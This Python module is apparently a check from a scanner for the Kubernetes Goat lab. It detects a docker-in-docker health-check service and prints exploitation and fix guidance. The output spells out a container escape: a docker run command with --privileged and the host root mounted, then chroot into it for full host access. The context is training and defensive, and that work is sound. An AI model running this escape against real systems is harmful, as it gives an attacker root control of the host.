
import requests

def run(target_url: str) -> dict:
    """
    Scenario 2: DIND (docker-in-docker) exploitation
    """
    target = target_url.rstrip('/')
    
    # DIND Check: Usually Port 1231 in K8s Goat
    # We check for a specific response characteristic of this app
    is_vulnerable = False
    details = ""

    try:
        # The DIND app usually has a specific title or response
        r = requests.get(target, timeout=5)
        if r.status_code == 200 and ("health-check" in r.text.lower() or "dind" in r.text.lower() or "pickup" in r.text.lower()):
            is_vulnerable = True
            details = "Service appears to be the DIND Health Check application."
        # If strict port match is implied by user knowing the port:
        elif ":1231" in target and r.status_code == 200:
             is_vulnerable = True
             details = "Target matches DIND service port (1231)."
    except:
        pass

    if is_vulnerable:
        return {
            "success": True,
            "output": f"""[+] VULNERABILITY DETECTED: DIND (Docker-in-Docker) Structure
Target: {target}
Details: {details}

[How to Exploit]
1. Access: If RCE is achieved (e.g., via Command Injection in this app), you are inside a container with Docker socket access.
2. Socket Check: `ls -la /var/run/docker.sock`
3. Escape: Use the mounted socket to instantiate a privileged container on the host.
   Command: `docker -H unix:///var/run/docker.sock run -it --privileged --net=host -v /:/host ubuntu chroot /host bash`
   Result: Full Host Access.

[How to Fix]
1. Avoid DIND: Do not verify/mount `/var/run/docker.sock` inside containers unless absolutely necessary.
2. Use Alternatives: Use Kaniko or other tools for building images inside K8s without privileged mode.
3. Policy: Enforce PSP/PSA to block privileged containers and host path mounts.
"""
        }
    else:
        return {"success": False, "output": f"[-] Target {target} is not the DIND Health Check service."}
